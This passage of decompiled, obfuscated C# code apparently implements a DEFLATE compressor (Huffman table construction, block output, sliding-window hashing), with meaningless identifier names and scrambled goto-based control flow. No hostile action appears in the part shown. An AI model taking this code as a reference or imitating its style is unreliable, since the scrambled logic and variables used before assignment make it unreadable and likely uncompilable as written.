          (byte) 2,
          (byte) 10,
          (byte) 6,
          (byte) 14,
          (byte) 1,
          (byte) 9,
          (byte) 5,
          (byte) 13,
          (byte) 3,
          (byte) 11,
          (byte) 7,
          (byte) 15
        };
        \u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F1\u003F = new short[286];
        \u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F2\u003F = new byte[286];
        if (false)
          goto label_5;
        else
          goto label_15;
label_3:
        int index;
        if (true)
        {
          \u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F2\u003F[index++] = (byte) 8;
          goto label_14;
        }
        else
          goto label_6;
label_5:
        \u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F2\u003F[index++] = (byte) 9;
label_6:
        if (index < 256)
        {
          \u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F1\u003F[index] = \u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F8\u003F(256 + index << 7);
          goto label_5;
        }
        else
        {
          if (true)
          {
            while (true)
            {
              int num1 = index;
label_9:
              if (num1 < 280)
              {
                \u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F1\u003F[index] = \u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F8\u003F(index - 256 << 9);
                if (true)
                  \u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F2\u003F[index++] = (byte) 7;
                else
                  goto label_0;
              }
              else
              {
                for (; index < 286; \u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F2\u003F[index++] = (byte) 8)
                  \u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F1\u003F[index] = \u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F8\u003F(index - 88 << 8);
                \u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F2\u003F = new short[30];
                \u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F9\u003F = new byte[30];
                if (true)
                {
                  int num2;
                  for (index = 0; index < 30; index = num2 + 1)
                  {
                    \u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F2\u003F[index] = \u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F8\u003F(index << 11);
                    if (true)
                    {
                      \u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F9\u003F[index] = (byte) 5;
                      num2 = index;
                      if (false)
                      {
                        num1 = num2;
                        goto label_9;
                      }
                    }
                    else
                      goto label_1;
                  }
                  break;
                }
                goto label_3;
              }
            }
            return;
          }
          goto label_0;
        }
label_14:
        if (index < 144)
        {
          \u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F1\u003F[index] = \u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F8\u003F(48 + index << 8);
          goto label_3;
        }
        else
          goto label_6;
label_15:
        index = 0;
        goto label_14;
      }

      public \u003F16\u003F(\u003F9\u003F.\u003F2\u003F.\u003F6\u003F _param1)
      {
        this.\u003F8\u003F = _param1;
        this.\u003F8\u003F = new \u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F8\u003F(this, 286, 257, 15);
        this.\u003F1\u003F = new \u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F8\u003F(this, 30, 1, 15);
        this.\u003F2\u003F = new \u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F8\u003F(this, 19, 4, 7);
        this.\u003F8\u003F = new short[16384];
        this.\u003F1\u003F = new byte[16384];
      }

      public void \u003F8\u003F()
      {
        this.\u003F6\u003F = 0;
        this.\u003F7\u003F = 0;
      }

      private int \u003F8\u003F(int _param1)
      {
        int num1 = _param1;
        if (false)
          goto label_5;
        else
          goto label_9;
label_2:
        if (true)
          goto label_12;
label_6:
        int num2;
        _param1 = num2;
        goto label_7;
label_12:
        num2 >>= 1;
        goto label_6;
label_5:
        int num3 = num1;
        num2 = _param1;
        goto label_2;
label_7:
        int num4 = _param1;
        if (false)
        {
          num2 = num4;
          goto label_2;
        }
        else
        {
          int num5 = 8;
          if (num5 != 0)
            goto label_14;
label_3:
          return num4 + num5;
label_14:
          if (num4 >= num5)
          {
            num1 = num3 + 4;
            goto label_5;
          }
          else
          {
            int num6 = num3;
            num5 = _param1;
            num4 = num6;
            goto label_3;
          }
        }
label_9:
        if (num1 == (int) byte.MaxValue)
          return 285;
        if (true)
        {
          num3 = 257;
          goto label_7;
        }
        else
          goto label_7;
      }

      private int \u003F1\u003F(int _param1)
      {
        int num1;
        do
        {
          if (true)
            goto label_4;
label_1:
          continue;
label_4:
          num1 = 0;
          goto label_1;
        }
        while (false);
        int num2;
        while (true)
        {
          int num3 = _param1;
          int num4 = 4;
          int num5;
          int num6;
          while (true)
          {
            if (num3 >= num4)
              goto label_5;
            else
              goto label_7;
label_2:
            num6 = 1;
            int num7;
            num5 = num7;
label_3:
            if (num6 == 0)
            {
              num4 = num6;
              num3 = num5;
              continue;
            }
            break;
label_5:
            num5 = num1;
            num6 = 2;
            if (num6 != 0)
            {
              num1 = num5 + num6;
              num7 = _param1;
              goto label_2;
            }
            else
              goto label_3;
label_7:
            num2 = num1 + _param1;
            if (false)
            {
              num7 = num2;
              goto label_2;
            }
            else
              goto label_13;
          }
          _param1 = num5 >> num6;
        }
label_13:
        return num2;
      }

      public void \u003F8\u003F(int _param1)
      {
        \u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F8\u003F obj = this.\u003F2\u003F;
        if (true)
          obj.\u003F8\u003F();
        this.\u003F8\u003F.\u003F8\u003F();
        this.\u003F1\u003F.\u003F8\u003F();
        this.\u003F8\u003F.\u003F8\u003F(this.\u003F8\u003F.\u003F1\u003F - 257, 5);
        this.\u003F8\u003F.\u003F8\u003F(this.\u003F1\u003F.\u003F1\u003F - 1, 5);
        this.\u003F8\u003F.\u003F8\u003F(_param1 - 4, 4);
        for (int index = 0; index < _param1; ++index)
          this.\u003F8\u003F.\u003F8\u003F((int) this.\u003F2\u003F.\u003F8\u003F[\u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F8\u003F[index]], 3);
        this.\u003F8\u003F.\u003F1\u003F(this.\u003F2\u003F);
        this.\u003F1\u003F.\u003F1\u003F(this.\u003F2\u003F);
      }

      public void \u003F1\u003F()
      {
        int num1 = 0;
        if (num1 != 0)
          goto label_6;
        else
          goto label_11;
label_1:
        int num2;
        int num3 = num2 - 261;
label_2:
        int num4 = 4;
        int num5;
        int num6;
        int num7;
        int num8;
        int num9;
        if (num4 != 0)
        {
          int num10 = num3 / num4;
          num8 = num10;
          num9 = 0;
          if (num9 == 0)
          {
            if (num8 > num9 && num10 <= 5)
              goto label_17;
label_3:
            if (true)
            {
              num7 = this.\u003F1\u003F(num6);
              goto label_4;
            }
            else
              goto label_1;
label_17:
            this.\u003F8\u003F.\u003F8\u003F(num5 & (1 << num10) - 1, num10);
            goto label_3;
          }
          else
            goto label_9;
        }
        else
          goto label_13;
label_4:
        this.\u003F1\u003F.\u003F8\u003F(num7);
        num1 = num7;
label_5:
        num1 = num1 / 2 - 1;
label_6:
        if (true)
        {
          int num11 = num1;
          if (num11 > 0)
          {
            if (true)
              this.\u003F8\u003F.\u003F8\u003F(num6 & (1 << num11) - 1, num11);
            else
              goto label_4;
          }
        }
        else
          goto label_5;
label_8:
        int index;
        num3 = index;
        if (true)
        {
          num9 = 1;
          num8 = num3;
        }
        else
          goto label_2;
label_9:
        index = num8 + num9;
label_10:
        if (index < this.\u003F6\u003F)
        {
          num5 = (int) this.\u003F1\u003F[index] & (int) byte.MaxValue;
          int num12 = (int) this.\u003F8\u003F[index];
          num4 = num12 - 1;
          num3 = num12;
          goto label_13;
        }
        else
        {
          this.\u003F8\u003F.\u003F8\u003F(256);
          return;
        }
label_11:
        index = num1;
        goto label_10;
label_13:
        num6 = num4;
        if (num3 == 0)
        {
          this.\u003F8\u003F.\u003F8\u003F(num5);
          goto label_8;
        }
        else
        {
          num2 = this.\u003F8\u003F(num5);
          this.\u003F8\u003F.\u003F8\u003F(num2);
          goto label_1;
        }
      }

      public void \u003F8\u003F(byte[] _param1, int _param2, int _param3, bool _param4)
      {
        this.\u003F8\u003F.\u003F8\u003F(_param4 ? 1 : 0, 3);
        this.\u003F8\u003F.\u003F8\u003F();
        this.\u003F8\u003F.\u003F8\u003F(_param3);
        this.\u003F8\u003F.\u003F8\u003F(~_param3);
        this.\u003F8\u003F.\u003F8\u003F(_param1, _param2, _param3);
        this.\u003F8\u003F();
      }

      public void \u003F1\u003F(byte[] _param1, int _param2, int _param3, bool _param4)
      {
        short[] numArray;
        (numArray = this.\u003F8\u003F.\u003F8\u003F)[256] = (short) ((int) numArray[256] + 1);
        this.\u003F8\u003F.\u003F1\u003F();
        this.\u003F1\u003F.\u003F1\u003F();
        if (true)
          goto label_13;
label_3:
        int num1;
        int index1;
        int num2;
        int num3;
        int num4;
        while (true)
        {
          int num5;
          int num6;
          if (index1 > num1)
          {
            num5 = (int) this.\u003F2\u003F.\u003F8\u003F[\u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F8\u003F[index1]];
            num6 = 0;
          }
          else
            goto label_17;
label_14:
          if (num5 > num6)
            goto label_15;
label_2:
          --index1;
          continue;
label_15:
          num4 = index1;
          if (true)
          {
            num1 = num4 + 1;
            goto label_2;
          }
          else
            break;
label_17:
          num2 = 14 + num1 * 3 + this.\u003F2\u003F.\u003F8\u003F() + this.\u003F8\u003F.\u003F8\u003F() + this.\u003F1\u003F.\u003F8\u003F() + this.\u003F7\u003F;
          num3 = this.\u003F7\u003F;
          for (int index2 = 0; index2 < 286; ++index2)
            num3 += (int) this.\u003F8\u003F.\u003F8\u003F[index2] * (int) \u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F2\u003F[index2];
          for (int index3 = 0; index3 < 30; ++index3)
          {
            int num7 = num3;
            int num8 = (int) this.\u003F1\u003F.\u003F8\u003F[index3] * (int) \u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F9\u003F[index3];
            if (false)
            {
              num6 = num8;
              num5 = num7;
              goto label_14;
            }
            else
              num3 = num7 + num8;
          }
          goto label_20;
        }
label_10:
        int num9 = num3;
        if (num4 != num9)
        {
          this.\u003F8\u003F.\u003F8\u003F(4 + (_param4 ? 1 : 0), 3);
        }
        else
        {
          this.\u003F8\u003F.\u003F8\u003F(2 + (_param4 ? 1 : 0), 3);
          this.\u003F8\u003F.\u003F8\u003F(\u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F1\u003F, \u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F2\u003F);
          this.\u003F1\u003F.\u003F8\u003F(\u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F2\u003F, \u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F9\u003F);
          this.\u003F1\u003F();
          this.\u003F8\u003F();
          return;
        }
label_12:
        this.\u003F8\u003F(num1);
        this.\u003F1\u003F();
        this.\u003F8\u003F();
        return;
label_20:
        if (num2 >= num3)
          goto label_21;
label_8:
        if (_param2 >= 0)
          goto label_22;
label_9:
        num4 = num2;
        goto label_10;
label_22:
        if (true)
        {
          if (_param3 + 4 < num2 >> 3)
          {
            this.\u003F8\u003F(_param1, _param2, _param3, _param4);
            return;
          }
          goto label_9;
        }
        else
          goto label_12;
label_21:
        num2 = num3;
        goto label_8;
label_13:
        this.\u003F8\u003F.\u003F8\u003F(this.\u003F2\u003F);
        this.\u003F1\u003F.\u003F8\u003F(this.\u003F2\u003F);
        this.\u003F2\u003F.\u003F1\u003F();
        num1 = 4;
        index1 = 18;
        goto label_3;
      }

      public bool \u003F8\u003F() => this.\u003F6\u003F >= 16384;

      public bool \u003F8\u003F(int _param1)
      {
        this.\u003F8\u003F[this.\u003F6\u003F] = (short) 0;
        byte[] numArray1 = this.\u003F1\u003F;
        \u003F9\u003F.\u003F2\u003F.\u003F16\u003F obj = this;
        int num1;
        int num2 = num1 = obj.\u003F6\u003F;
        obj.\u003F6\u003F = num1 + 1;
        int index1 = num2;
        int num3 = (int) (byte) _param1;
        numArray1[index1] = (byte) num3;
        short[] numArray2;
        int index2;
        (numArray2 = this.\u003F8\u003F.\u003F8\u003F)[index2 = _param1] = (short) ((int) numArray2[(IntPtr) index2] + 1);
        return this.\u003F8\u003F();
      }

      public bool \u003F8\u003F(int _param1, int _param2)
      {
        this.\u003F8\u003F[this.\u003F6\u003F] = (short) _param1;
        byte[] numArray1 = this.\u003F1\u003F;
        \u003F9\u003F.\u003F2\u003F.\u003F16\u003F obj = this;
        int num1 = obj.\u003F6\u003F;
        if (true)
          goto label_4;
label_1:
        obj.\u003F6\u003F = num1 + 1;
        int num2;
        int index1 = num2;
        int num3 = (int) (byte) (_param2 - 3);
        numArray1[index1] = (byte) num3;
        int num4 = this.\u003F8\u003F(_param2 - 3);
        short[] numArray2;
        IntPtr index2;
        (numArray2 = this.\u003F8\u003F.\u003F8\u003F)[(int) (index2 = (IntPtr) num4)] = (short) ((int) numArray2[index2] + 1);
        if (num4 >= 265 && num4 < 285)
          goto label_5;
label_2:
        int num5 = this.\u003F1\u003F(_param1 - 1);
        short[] numArray3;
        IntPtr index3;
        (numArray3 = this.\u003F1\u003F.\u003F8\u003F)[(int) (index3 = (IntPtr) num5)] = (short) ((int) numArray3[index3] + 1);
        if (num5 >= 4)
          goto label_6;
label_3:
        return this.\u003F8\u003F();
label_6:
        this.\u003F7\u003F += num5 / 2 - 1;
        goto label_3;
label_5:
        this.\u003F7\u003F += (num4 - 261) / 4;
        goto label_2;
label_4:
        num2 = num1;
        goto label_1;
      }

      public sealed class \u003F8\u003F
      {
        public short[] \u003F8\u003F;
        public byte[] \u003F8\u003F;
        public int \u003F8\u003F;
        public int \u003F1\u003F;
        private short[] \u003F1\u003F;
        private int[] \u003F8\u003F;
        private int \u003F2\u003F;
        private \u003F9\u003F.\u003F2\u003F.\u003F16\u003F \u003F8\u003F;

        public \u003F8\u003F(
          \u003F9\u003F.\u003F2\u003F.\u003F16\u003F _param1,
          int _param2,
          int _param3,
          int _param4)
        {
          this.\u003F8\u003F = _param1;
          this.\u003F8\u003F = _param3;
          this.\u003F2\u003F = _param4;
          this.\u003F8\u003F = new short[_param2];
          this.\u003F8\u003F = new int[_param4];
        }

        public void \u003F8\u003F(int _param1) => this.\u003F8\u003F.\u003F8\u003F.\u003F8\u003F((int) this.\u003F1\u003F[_param1] & (int) ushort.MaxValue, (int) this.\u003F8\u003F[_param1]);

        public void \u003F8\u003F(short[] _param1, byte[] _param2)
        {
          this.\u003F1\u003F = _param1;
          this.\u003F8\u003F = _param2;
        }

        public void \u003F8\u003F()
        {
          int length = this.\u003F8\u003F.Length;
label_9:
          int[] numArray = new int[this.\u003F2\u003F];
          int num1;
          if (true)
            num1 = 0;
          this.\u003F1\u003F = new short[this.\u003F8\u003F.Length];
          int index1 = 0;
          while (true)
          {
            int num2 = index1;
            if (false)
              goto label_7;
            else
              goto label_14;
label_1:
            int num3;
            int num4;
            num1 = num3 + num4;
            int num5 = index1;
            if (true)
            {
              index1 = num5 + 1;
              continue;
            }
label_3:
            int index2 = num5;
            goto label_8;
label_7:
            index2 = num2;
label_8:
            num3 = index2;
            num4 = this.\u003F1\u003F;
            if (true)
              goto label_19;
label_6:
            num2 = num3 + num4;
            goto label_7;
label_19:
            if (true)
            {
              if (num3 < num4)
              {
                int num6 = (int) this.\u003F8\u003F[index2];
                if (true)
                {
                  if (num6 > 0)
                    goto label_18;
label_5:
                  int num7 = index2;
                  num4 = 1;
                  num3 = num7;
                  goto label_6;
label_18:
                  this.\u003F1\u003F[index2] = \u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F8\u003F(numArray[num6 - 1]);
                  numArray[num6 - 1] += 1 << 16 - num6;
                  goto label_5;
                }
                else
                  goto label_9;
              }
              else
                break;
            }
            else
              goto label_1;
label_14:
            int num8 = this.\u003F2\u003F;
            if (num2 < num8)
            {
              numArray[index1] = num1;
              int num9 = num1;
              num4 = this.\u003F8\u003F[index1] << 15 - index1;
              num3 = num9;
              goto label_1;
            }
            else if (true)
            {
              num5 = 0;
              goto label_3;
            }
            else
              goto label_8;
          }
        }

        private void \u003F8\u003F(int[] _param1)
        {
          this.\u003F8\u003F = new byte[this.\u003F8\u003F.Length];
          int length = _param1.Length / 2;
          int num1 = (length + 1) / 2;
          if (true)
            goto label_20;
label_1:
          for (int index = 0; index < this.\u003F2\u003F; ++index)
          {
            if (true)
              this.\u003F8\u003F[index] = 0;
            else
              goto label_7;
          }
          goto label_22;
label_7:
          int index1;
          int[] numArray1;
          this.\u003F8\u003F[_param1[2 * index1]] = (byte) numArray1[index1];
label_8:
          --index1;
label_9:
          int num2 = index1;
          int num3;
          int num4;
          int num5;
          while (true)
          {
            if (num2 < 0)
            {
              if (num3 != 0)
              {
                if (true)
                {
                  int index2 = this.\u003F2\u003F - 1;
                  int num6;
                  do
                  {
                    do
                      ;
                    while (this.\u003F8\u003F[--index2] == 0);
label_13:
                    --this.\u003F8\u003F[index2];
                    int[] numArray2;
                    int[] numArray3 = numArray2 = this.\u003F8\u003F;
                    int index3;
                    index2 = index3 = index2 + 1;
                    int index4 = index3;
                    int num7 = numArray3[(IntPtr) index4] + 1;
                    numArray2[index3] = num7;
                    num4 = num3;
                    num5 = 1;
                    if (num5 != 0)
                    {
                      int num8 = num5 << this.\u003F2\u003F - 1 - index2;
                      num6 = num4 - num8;
                      if (true)
                      {
                        num3 = num6;
                        if (num3 > 0 && index2 < this.\u003F2\u003F - 1)
                          goto label_13;
                      }
                      else
                        goto label_32;
                    }
                    else
                      goto label_15;
                  }
                  while (num3 > 0);
                  goto label_30;
label_32:
                  num2 = num6;
                }
                else
                  goto label_9;
              }
              else
                goto label_35;
            }
            else
              break;
          }
          int num9;
          if (_param1[2 * index1 + 1] == -1)
          {
            ++this.\u003F8\u003F[numArray1[index1] - 1];
            goto label_7;
          }
          else
          {
            num9 = numArray1[index1] + 1;
            if (num9 > this.\u003F2\u003F)
            {
              num9 = this.\u003F2\u003F;
              ++num3;
            }
          }
label_5:
          numArray1[_param1[2 * index1]] = numArray1[_param1[2 * index1 + 1]] = num9;
          goto label_8;
label_15:
          int num10 = num4 * num5;
          for (int index5 = this.\u003F2\u003F; index5 != 0; --index5)
          {
            if (true)
            {
              int num11 = this.\u003F8\u003F[index5 - 1];
              while (num11 > 0)
              {
                int index6 = 2 * _param1[num10++];
                if (_param1[index6 + 1] == -1)
                {
                  this.\u003F8\u003F[_param1[index6]] = (byte) index5;
                  --num11;
                }
              }
            }
            else
              goto label_5;
          }
          return;
label_35:
          return;
label_30:
          int[] numArray4 = this.\u003F8\u003F;
          int index7;
          int num12 = numArray4[(IntPtr) (index7 = this.\u003F2\u003F - 1)] + num3;
          numArray4[index7] = num12;
          this.\u003F8\u003F[this.\u003F2\u003F - 2] -= num3;
          num5 = num1;
          num4 = 2;
          goto label_15;
label_22:
          numArray1 = new int[length];
          numArray1[length - 1] = 0;
          index1 = length - 1;
          goto label_9;
label_20:
          num3 = 0;
          goto label_1;
        }

        public void \u003F1\u003F()
        {
          int length = this.\u003F8\u003F.Length;
          int[] numArray1 = new int[length];
          int num1 = 0;
label_1:
          int num2 = 0;
label_6:
          for (int index1 = 0; index1 < length; ++index1)
          {
            int num3 = (int) this.\u003F8\u003F[index1];
            if (num3 == 0)
              continue;
            int index2 = num1++;
            while (true)
            {
              int index3;
              if (index2 > 0 && (int) this.\u003F8\u003F[numArray1[index3 = (index2 - 1) / 2]] > num3)
              {
                if (true)
                {
                  numArray1[index2] = numArray1[index3];
                  index2 = index3;
                }
                else
                  goto label_21;
              }
              else
              {
                numArray1[index2] = index1;
                num2 = index1;
                goto label_6;
              }
            }
            goto label_22;
          }
          int num4;
          for (; num1 < 2; numArray1[num1++] = num4)
          {
            int num5;
            if (num2 < 2)
              num2 = num5 = num2 + 1;
            else
              goto label_35;
label_9:
            num4 = num5;
            continue;
label_35:
            num5 = 0;
            goto label_9;
          }
          this.\u003F1\u003F = Math.Max(num2 + 1, this.\u003F8\u003F);
          int num6 = num1;
          int num7 = 4 * num1;
          int num8 = 2;
          int num9 = num7;
label_11:
          int[] numArray2 = new int[num9 - num8];
          int[] numArray3 = new int[2 * num1 - 1];
          int num10 = num6;
          for (int index4 = 0; index4 < num1; ++index4)
          {
            int index5 = numArray1[index4];
            numArray2[2 * index4] = index5;
            numArray2[2 * index4 + 1] = -1;
            numArray3[index4] = (int) this.\u003F8\u003F[index5] << 8;
            numArray1[index4] = index4;
          }
label_14:
          int index6 = numArray1[0];
          int index7 = numArray1[--num1];
          int index8 = 0;
          int index9;
          int num11;
          int num12;
          for (index9 = 1; index9 < num1; index9 = index9 * 2 + 1)
          {
            if (index9 + 1 < num1)
              goto label_37;
label_16:
            numArray1[index8] = numArray1[index9];
            index8 = index9;
            continue;
label_37:
            num11 = numArray3[numArray1[index9]];
            num12 = numArray3[numArray1[index9 + 1]];
            if (true)
            {
              if (num11 > num12)
              {
                ++index9;
                goto label_16;
              }
              else
                goto label_16;
            }
            else
              goto label_24;
          }
          int num13 = numArray3[index7];
label_19:
          int index10;
          while ((index10 = index8) > 0 && numArray3[numArray1[index8 = (index10 - 1) / 2]] > num13)
          {
            if (true)
              numArray1[index10] = numArray1[index8];
            else
              goto label_14;
          }
          numArray1[index10] = index7;
          int index11 = numArray1[0];
          index7 = num10++;
          if (true)
            numArray2[2 * index7] = index6;
          else
            goto label_1;
label_21:
          numArray2[2 * index7 + 1] = index11;
label_22:
          int val1 = numArray3[index6] & (int) byte.MaxValue;
          if (true)
          {
            int val2 = numArray3[index11] & (int) byte.MaxValue;
            int num14 = Math.Min(val1, val2);
            if (true)
            {
              int[] numArray4 = numArray3;
              int index12 = index7;
              int[] numArray5 = numArray3;
              int index13 = index6;
              int num15;
              num13 = num15 = numArray5[index13] + numArray3[index11] - num14 + 1;
              numArray4[index12] = num15;
              index8 = 0;
              index9 = 1;
              goto label_26;
            }
            else
              goto label_19;
          }
          else
            goto label_29;
label_24:
          if (num11 + num12 < num1 && numArray3[numArray1[index9]] > numArray3[numArray1[index9 + 1]])
            goto label_45;
label_25:
          numArray1[index8] = numArray1[index9];
          index8 = index9;
          num9 = index8 * 2;
          num8 = 1;
          if (num8 != 0)
          {
            index9 = num9 + num8;
            goto label_26;
          }
          else
            goto label_11;
label_45:
          ++index9;
          goto label_25;
label_26:
          if (index9 < num1)
          {
            int num16 = index9;
            num12 = 1;
            num11 = num16;
            goto label_24;
          }
label_28:
          if ((index10 = index8) > 0)
          {
            int[] numArray6 = numArray3;
            int[] numArray7 = numArray1;
            int num17 = index10;
            int index14;
            index8 = index14 = (num17 - 1) / 2;
            int index15 = numArray7[index14];
            val1 = numArray6[index15];
          }
          else
            goto label_30;
label_29:
          int num18 = num13;
          if (val1 > num18)
          {
            numArray1[index10] = numArray1[index8];
            goto label_28;
          }
label_30:
          numArray1[index10] = index7;
          if (num1 <= 1)
            this.\u003F8\u003F(numArray2);
          else
            goto label_14;
        }

        public int \u003F8\u003F()
        {
          int num1 = 0;
          int num2 = 0;
          while (true)
          {
            int index = num2;
            int num3;
            while (true)
            {
              int num4 = index;
              int num5 = this.\u003F8\u003F.Length;
              int num6;
              while (true)
              {
                int num7 = num5;
                if (false)
                {
                  num5 = num7;
                }
                else
                {
                  if (num4 < num7)
                  {
                    int num8 = num1;
                    num5 = (int) this.\u003F8\u003F[index] * (int) this.\u003F8\u003F[index];
                    num4 = num8;
                    break;
                  }
                  int num9 = num1;
                  if (false)
                  {
                    num6 = num9;
                    goto label_3;
                  }
                  else
                  {
                    if (true)
                      return num9;
                    num3 = num9;
                    goto label_2;
                  }
                }
              }
              num3 = num4 + num5;
label_2:
              if (true)
              {
                num1 = num3;
                num6 = index;
              }
              else
                break;
label_3:
              index = num6 + 1;
            }
            num2 = num3;
          }
        }

        public void \u003F8\u003F(\u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F8\u003F _param1)
        {
label_0:
          int num1 = -1;
          if (false)
            goto label_5;
          else
            goto label_17;
label_3:
          int num2;
          if (true)
            num2 = 0;
          else
            goto label_0;
label_4:
          int num3;
          num1 = num3;
label_5:
          int index1;
          ++index1;
          goto label_8;
label_7:
          int num4;
          index1 = num4;
          int num5;
          int num6;
          if (true)
          {
            num2 = num6 = num2 + 1;
            if (true)
            {
              if (num6 >= num5)
                goto label_10;
            }
            else
              goto label_9;
          }
          else
            goto label_3;
label_8:
          int num7 = index1;
          if (true)
          {
            int num8 = this.\u003F1\u003F;
            if (num7 < num8)
              num6 = num1;
            else
              goto label_10;
          }
          else
            goto label_13;
label_9:
          if (num6 == (int) this.\u003F8\u003F[index1])
          {
            num4 = index1 + 1;
            goto label_7;
          }
label_10:
          int num9;
          if (num2 >= num9)
          {
            if (num1 == 0)
            {
              num7 = num2;
            }
            else
            {
              short[] numArray = _param1.\u003F8\u003F;
              numArray[16] = (short) ((int) numArray[16] + 1);
              goto label_15;
            }
          }
          else
          {
            short[] numArray = _param1.\u003F8\u003F;
            int index2;
            int num10 = (int) (short) ((int) numArray[(IntPtr) (index2 = num1)] + (int) (short) num2);
            numArray[index2] = (short) num10;
            goto label_15;
          }
label_13:
          if (num7 <= 10)
          {
            short[] numArray;
            (numArray = _param1.\u003F8\u003F)[17] = (short) ((int) numArray[17] + 1);
            goto label_15;
          }
label_14:
          short[] numArray1;
          (numArray1 = _param1.\u003F8\u003F)[18] = (short) ((int) numArray1[18] + 1);
label_15:
          if (index1 >= this.\u003F1\u003F)
            return;
          num2 = 1;
          num3 = (int) this.\u003F8\u003F[index1];
          if (num3 != 0)
          {
            num5 = 6;
            num9 = 3;
            if (true)
            {
              if (num1 != num3)
              {
                short[] numArray2;
                int index3;
                int num11 = (int) (short) ((int) (numArray2 = _param1.\u003F8\u003F)[(IntPtr) (index3 = num3)] + 1);
                numArray2[index3] = (short) num11;
                goto label_3;
              }
              else
                goto label_4;
            }
            else
              goto label_14;
          }
          else
          {
            num5 = 138;
            num4 = 3;
            if (num4 != 0)
            {
              num9 = num4;
              goto label_4;
            }
            else
              goto label_7;
          }
label_17:
          index1 = 0;
          goto label_15;
        }

        public void \u003F1\u003F(\u003F9\u003F.\u003F2\u003F.\u003F16\u003F.\u003F8\u003F _param1)
        {
          int num1 = -1;
          int index = 0;
label_16:
          int num2;
          while (true)
          {
            if (false)
              goto label_5;
            else
              goto label_25;
label_2:
            int num3;
            int num4;
            int num5;
            if (true)
            {
              if (num5 != 0)
              {
                num3 = 6;
                num4 = 3;
                if (num1 == num5)
                  goto label_6;
              }
              else
              {
                num3 = 138;
                num4 = 3;
                goto label_6;
              }
            }
            else
              break;
label_4:
            if (true)
              _param1.\u003F8\u003F(num5);
            else
              goto label_2;
label_5:
            if (true)
              num2 = 0;
            else
              goto label_8;
label_6:
            num1 = num5;
            if (true)
              ++index;
            else
              goto label_4;
label_8:
            while (index < this.\u003F1\u003F && num1 == (int) this.\u003F8\u003F[index])
            {
              ++index;
              if (++num2 >= num3)
                break;
            }
            if (num2 >= num4)
            {
              if (num1 == 0)
                goto label_14;
label_13:
              _param1.\u003F8\u003F(16);
              this.\u003F8\u003F.\u003F8\u003F.\u003F8\u003F(num2 - 3, 2);
              continue;
label_14:
              if (num2 > 10)
              {
                _param1.\u003F8\u003F(18);
                if (true)
                {
                  if (true)
                  {
                    this.\u003F8\u003F.\u003F8\u003F.\u003F8\u003F(num2 - 11, 7);
                    continue;
                  }
                  goto label_6;
                }
                else
                  goto label_13;
              }
              else
              {
                _param1.\u003F8\u003F(17);
                this.\u003F8\u003F.\u003F8\u003F.\u003F8\u003F(num2 - 3, 3);
                continue;
              }
            }
            else
              goto label_11;
label_25:
            if (index < this.\u003F1\u003F)
            {
              num2 = 1;
              num5 = (int) this.\u003F8\u003F[index];
              goto label_2;
            }
            else
              goto label_26;
          }
label_10:
          _param1.\u003F8\u003F(num1);
label_11:
          if (num2-- > 0)
            goto label_10;
          else
            goto label_16;
label_26:;
        }
      }
    }

    internal sealed class \u003F5\u003F
    {
      private const int \u003F8\u003F = 258;
      private const int \u003F1\u003F = 3;
      private const int \u003F2\u003F = 32768;
      private const int \u003F9\u003F = 32767;
      private const int \u003F3\u003F = 32768;
      private const int \u003F4\u003F = 32767;
      private const int \u003F16\u003F = 5;
      private const int \u003F5\u003F = 262;
      private const int \u003F6\u003F = 32506;
      private const int \u003F7\u003F = 4096;
      private int \u003F23\u003F;
      private short[] \u003F8\u003F;
      private short[] \u003F1\u003F;
      private int \u003F24\u003F;
      private int \u003F25\u003F;
      private bool \u003F8\u003F;
      private int \u003F26\u003F;
      private int \u003F92\u003F;
      private int \u003F94\u003F;
      private byte[] \u003F8\u003F;
      private byte[] \u003F1\u003F;
      private int \u003F95\u003F;
      private int \u003F96\u003F;
      private int \u003F97\u003F;
      private \u003F9\u003F.\u003F2\u003F.\u003F6\u003F \u003F8\u003F;
      private \u003F9\u003F.\u003F2\u003F.\u003F16\u003F \u003F8\u003F;

      public \u003F5\u003F(\u003F9\u003F.\u003F2\u003F.\u003F6\u003F _param1)
      {
        this.\u003F8\u003F = _param1;
        this.\u003F8\u003F = new \u003F9\u003F.\u003F2\u003F.\u003F16\u003F(_param1);
        this.\u003F8\u003F = new byte[65536];
        this.\u003F8\u003F = new short[32768];
        this.\u003F1\u003F = new short[32768];
        this.\u003F26\u003F = this.\u003F92\u003F = 1;
      }

      private void \u003F8\u003F() => this.\u003F23\u003F = (int) this.\u003F8\u003F[this.\u003F92\u003F] << 5 ^ (int) this.\u003F8\u003F[this.\u003F92\u003F + 1];

      private int \u003F8\u003F()
      {
label_0:
        int num1 = this.\u003F23\u003F << 5;
